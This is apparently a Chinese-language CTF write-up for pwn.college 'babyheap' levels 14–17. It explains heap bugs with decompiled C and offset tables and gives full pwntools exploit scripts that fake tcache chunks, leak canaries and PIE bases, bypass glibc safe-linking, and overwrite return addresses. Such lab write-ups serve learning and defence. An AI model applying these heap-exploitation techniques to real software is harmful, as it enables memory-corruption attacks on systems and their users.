class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">index,offset,n = <span class="number">6</span></span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  offset = <span class="built_in">str</span>(offset).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;echo&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(offset)</span><br><span class="line">  p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">  data = p.recv(n)</span><br><span class="line">  data = data[::-<span class="number">1</span>]</span><br><span class="line">  data = <span class="built_in">int</span>.from_bytes(data,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># data = int(data,16)</span></span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_free</span>():</span><br><span class="line">  p.sendline(<span class="string">b&#x27;stack_free&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_scanf</span>(<span class="params">content</span>):</span><br><span class="line">  p.sendline(<span class="string">b&#x27;stack_scanf&#x27;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#1.堆栈溢出构造假堆块并释放，使之进入tcache</span></span><br><span class="line"></span><br><span class="line">usable_size = <span class="number">0x130</span></span><br><span class="line">chunk_size = ( usable_size + <span class="number">0x10</span> ) | <span class="number">1</span>     <span class="comment">#1 means previous chunk is in use</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(chunk_size)</span><br><span class="line">stack_scanf(buffer)</span><br><span class="line">stack_free()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.通过假堆块泄露返回地址上的值, 泄露canary</span></span><br><span class="line">canary_offset = <span class="number">0x48</span></span><br><span class="line">main_retaddr_offset = <span class="number">0x58</span></span><br><span class="line">__libc_start_main_retaddr_offset = <span class="number">0x128</span></span><br><span class="line">malloc(<span class="number">1</span>,usable_size)</span><br><span class="line">main_retaddr_value = echo(<span class="number">1</span>,main_retaddr_offset)</span><br><span class="line">__libc_start_main_retaddr_value = echo(<span class="number">1</span>,__libc_start_main_retaddr_offset)</span><br><span class="line">canary = echo(<span class="number">1</span>,canary_offset+<span class="number">1</span>,<span class="number">7</span>)</span><br><span class="line">canary = canary &lt;&lt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">start_offset = <span class="number">0x13AE</span></span><br><span class="line">win_offset = <span class="number">0x1A22</span></span><br><span class="line">pie_base = __libc_start_main_retaddr_value - start_offset</span><br><span class="line">win_addr= pie_base + win_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(main_retaddr_offset)</span></span><br><span class="line"><span class="comment"># print(__libc_start_main_retaddr_offset)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_retaddr_value))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__libc_start_main_retaddr_value))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(win_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary = &quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.在假堆块上溢出</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*canary_offset + p64(canary) </span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(main_retaddr_offset - <span class="built_in">len</span>(payload)) + p64(win_addr)</span><br><span class="line"></span><br><span class="line">scanf(<span class="number">1</span>,payload)</span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level14.1">level14.1</h3>
<p>buffer视角</p>
<table>
<thead>
<tr>
<th></th>
<th>偏移</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>buffer</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>prev_size</td>
<td>+ 0x30</td>
<td></td>
</tr>
<tr>
<td>size</td>
<td>+ 0x38</td>
<td></td>
</tr>
<tr>
<td>chunk_mem</td>
<td>+ 0x40</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x88</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_ret</td>
<td>+ 0x98</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>libc_start_main_ret</td>
<td>+ 0x168</td>
<td></td>
</tr>
</tbody>
</table>
<p>假堆块视角</p>
<table>
<thead>
<tr>
<th></th>
<th>偏移</th>
</tr>
</thead>
<tbody>
<tr>
<td>chunk_mem</td>
<td>0</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x48</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>main_ret</td>
<td>+ 0x58</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>overflow_limit</td>
<td>+ 0x7f</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
<tr>
<td>libc_start_main_ret</td>
<td>+ 0x128</td>
</tr>
</tbody>
</table>
<p>值得注意的是win函数地址的最低字节是0x9写不进去?换成0x1D就可以了?</p>
<h3 id="level15.0">level15.0</h3>
<p>只有堆块的增删改查业务</p>
<p>还是借助<code>echo</code>泄露堆栈地址,
然后在堆栈上构造假堆块,涵盖返回地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//echo</span></span><br><span class="line">  _WORD stack_var[<span class="number">7</span>]; <span class="comment">// [rsp+22h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)stack_var, <span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  argv = (<span class="type">size_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  *argv = (<span class="type">size_t</span>)<span class="string">&quot;/bin/echo&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = (<span class="type">size_t</span>)stack_var;</span><br></pre></td></tr></table></figure>
<p>每次<code>echo</code>都会有内存泄露,
<code>argv</code>这个堆块不会被释放</p>
<p><code>argv[1]</code>保存了<code>echo</code>的一个局部变量的地址,
可以利用这一点泄露堆栈地址</p>
<blockquote>
<p>然而现在不能使用<code>UAF</code>,
因为在<code>main</code>中释放堆块时会立刻将堆块指针清零,
避免了<code>UAF</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, <span class="string">&quot;free&quot;</span>) )            <span class="comment">// free</span></span><br><span class="line">...</span><br><span class="line">      <span class="built_in">free</span>(chunks[index_1]);</span><br><span class="line">      chunks[index_1] = <span class="number">0LL</span>;                  <span class="comment">// 没有UAF</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>但是<code>main</code>中<code>read</code>有堆溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, <span class="string">&quot;read&quot;</span>) )                <span class="comment">// read</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%127s&quot;</span>, input);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br><span class="line">index_3 = atoi(input);</span><br><span class="line"><span class="keyword">if</span> ( index_3 &gt; <span class="number">0xF</span> )</span><br><span class="line">  __assert_fail(<span class="string">&quot;allocation_index &lt; 16&quot;</span>, <span class="string">&quot;&lt;stdin&gt;&quot;</span>, <span class="number">0x142</span>u, <span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%127s&quot;</span>, input);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br><span class="line">sizea = atoi(input);	<span class="comment">//越界写多少完全自己决定</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] read(0, allocations[%d], %d)\n&quot;</span>, index_3, sizea);</span><br><span class="line">read(<span class="number">0</span>, chunks[index_3], sizea);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br></pre></td></tr></table></figure>
<p>综上,整个利用过程:</p>
<p>0x1.首先<code>chunk1 = malloc(0x20)</code>,拿到一个堆块,那么第一次<code>echo</code>时申请的堆块A,就紧跟在<code>chunk1</code>后面高处,这是溢出的必要条件</p>
<p>0x2.第二次<code>echo</code>,以<code>chunk1</code>为基地址,泄露堆块<code>A+0x8</code>偏移处的堆栈地址,并根据相对距离计算得到<code>main</code>函数和<code>libc_start_main</code>函数的返回地址</p>
<p>0x3.利用堆溢出造成任意地址读,根据<code>libc_start_main</code>返回到<code>start</code>中的地址,计算得到<code>pie</code>基址,根据<code>win</code>的偏移量计算得到<code>win</code>的地址</p>
<p>0x4.利用堆溢出造成的任意地址写,修改<code>main</code>函数的返回地址为<code>win</code></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./babyheap_level15.0&quot;)</span></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyheap_level15.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">index,offset,size=<span class="number">0</span></span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    offset = <span class="built_in">str</span>(offset).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;echo&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(offset)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>):</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line">    data = <span class="built_in">int</span>.from_bytes(data,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;read&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)    </span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):				</span><br><span class="line">  malloc(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">  free(<span class="number">4</span>)</span><br><span class="line">  free(<span class="number">3</span>)</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(<span class="number">0x31</span>)+p64(addr)</span><br><span class="line">  read(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">  malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">6</span>,<span class="number">0x10</span>)</span><br><span class="line">  data = echo(<span class="number">6</span>,<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">addr,content</span>):</span><br><span class="line">  malloc(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">  free(<span class="number">4</span>)</span><br><span class="line">  free(<span class="number">3</span>)</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(<span class="number">0x31</span>)+p64(addr)</span><br><span class="line">  read(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">  malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">6</span>,<span class="number">0x10</span>)</span><br><span class="line">  read(<span class="number">6</span>,<span class="number">6</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">echo(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">data = echo(<span class="number">0</span>,<span class="number">0x38</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(data))</span><br><span class="line">stack_leak_addr = data</span><br><span class="line"></span><br><span class="line">main_ret = stack_leak_addr + <span class="number">0x176</span></span><br><span class="line">libc_start_main_ret = stack_leak_addr + <span class="number">0x246</span></span><br><span class="line"></span><br><span class="line">data = leak(libc_start_main_ret)    <span class="comment">#arbitrary read</span></span><br><span class="line">pie_base = data - <span class="number">0x142E</span></span><br><span class="line">win_addr = pie_base + <span class="number">0x1B00</span></span><br><span class="line"></span><br><span class="line">modify(main_ret,p64(win_addr))      <span class="comment">#arbitrary write</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level16.0">level16.0</h3>
<p>level16.0中使用libc-2.35,此时next指针已经被保护起来</p>
<p>利用
<code>tcache数据结构与算法/glibc-2.38/exploit/[safe-linking]*</code>的思路</p>
<p><strong>假设fake_chunk_mem已经对齐到0x10</strong></p>
<p>0x0.chunk0 = malloc(0x10)</p>
<p>0x1.chunk1 = malloc(0x10)</p>
<p>0x2.chunk2 = malloc(0x10)</p>
<p>0x3.free(chunk1)</p>
<p>0x4.free(chunk2)</p>
<p>0x5.[UAF] chunk2.next = ( 页框号 ) ^ (fake_chunk_mem)</p>
<p>0x6.chunk2 = malloc()</p>
<p>0x7.fake_chunk = malloc()</p>
<blockquote>
<p>此时fake_chunk.key归零</p>
<p>tcache-&gt;entries[idx] = REVEAL_PTR(fake_chunk.next)</p>
</blockquote>
<p>0x8.free(chunk0)</p>
<blockquote>
<p>此时chunk0.next = PROTECT_PTR(REVEAL_PTR(fake_chunk.next))</p>
</blockquote>
<p>0x9.[UAF] puts(chunk0.next)</p>
<p>0xA.计算fake_chunk.next</p>
<blockquote>
<p>fake_chunk.next = chunk0.next ^ (页框号) ^ (fake_chunk_addr &gt;&gt;
12)</p>
</blockquote>
<p>写个exp意思意思</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./babyheap_level16.0&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/babyheap_level16.0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">index, size = <span class="number">0</span></span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode() </span><br><span class="line">    p.sendline(<span class="string">b&#x27;puts&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">0</span>:</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">secret</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;send_flag&#x27;</span>)</span><br><span class="line">    p.sendline(secret)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr,size = <span class="number">0x10</span></span>):		//addr must be aligned to <span class="number">0x10</span></span><br><span class="line">    malloc(<span class="number">3</span>,size)</span><br><span class="line">    malloc(<span class="number">1</span>,size)</span><br><span class="line">    malloc(<span class="number">2</span>,size)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    chunk1_next = puts(<span class="number">1</span>)</span><br><span class="line">    chunk2_next = puts(<span class="number">2</span>)</span><br><span class="line">    chunk1_next = <span class="built_in">int</span>.from_bytes(chunk1_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    chunk2_next = <span class="built_in">int</span>.from_bytes(chunk2_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(chunk1_next))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;chunk2_next previously = &quot;</span>,<span class="built_in">hex</span>(chunk2_next))</span><br><span class="line">    chunk2_next = chunk1_next ^ addr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;chunk2_next now = &quot;</span>,<span class="built_in">hex</span>(chunk2_next))</span><br><span class="line">    scanf(<span class="number">2</span>,p64(chunk2_next))</span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">2</span>,size)</span><br><span class="line">    malloc(<span class="number">1</span>,size)    </span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    chunk3_next = puts(<span class="number">3</span>,<span class="number">8</span>)</span><br><span class="line">    chunk3_next = <span class="built_in">int</span>.from_bytes(chunk3_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    ep = chunk1_next ^ chunk3_next</span><br><span class="line">    data = (addr &gt;&gt; <span class="number">12</span>) ^ ep</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">secret_addr = <span class="number">0x433050</span></span><br><span class="line">malloc(<span class="number">9</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">page_num = puts(<span class="number">9</span>)</span><br><span class="line">page_num = <span class="built_in">int</span>.from_bytes(page_num, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(page_num))</span><br><span class="line"></span><br><span class="line">data = leak(secret_addr,<span class="number">0x10</span>)		//secret_addr = <span class="number">0x433050</span> <span class="keyword">is</span> aligned to <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(data))</span><br><span class="line">data = data.to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">payload = data + p64(<span class="number">0</span>) </span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">send_flag(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level17.0">level17.0</h3>
<p>ret2text</p>
<p>利用堆UAF将返回地址放到堆块上</p>
<p>调试发现返回地址都对齐到0x8</p>
<p>不满足堆块对齐到0x10的要求</p>
<p>因此假堆块可以在返回地址-0x8,-0x18等处</p>
<p>但是还有高手</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v3 = malloc_usable_size(chunks[index_2]);</span><br><span class="line"><span class="built_in">sprintf</span>(input, <span class="string">&quot;%%%us&quot;</span>, v3);</span><br><span class="line">v4 = malloc_usable_size(chunks[index_2]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] scanf(\&quot;%%%us\&quot;, allocations[%d])\n&quot;</span>, v4, index_2);</span><br><span class="line"><span class="built_in">scanf</span>(input, chunks[index_2]);</span><br></pre></td></tr></table></figure>
<p>在往假堆块写入之前,还有一个库函数<code>malloc_usable_size</code>调用,这位更是重量级,他会调用<code>musable</code></p>
<p>这位更是重中之重量级</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">musable</span><span class="params">(<span class="type">void</span> *mem)</span></span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr p = mem2chunk(mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p))</span><br><span class="line">        <span class="keyword">return</span> chunksize(p) - CHUNK_HDR_SZ;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (inuse(p))</span><br><span class="line">        <span class="keyword">return</span> memsize(p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果<code>p</code>没有<code>Mmap (2)</code>标志位,会调用<code>inuse(p)</code>这个函数会查看<strong>下一个</strong>堆块的<code>Prev_in_use (1)</code>标志位来判定<strong>当前</strong>堆块是否使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure>
<p>找下一个堆块的依据是本堆块的<code>size</code>,</p>
<p>也就是说<code>p + p.size</code>就偏移到了下一个堆块</p>
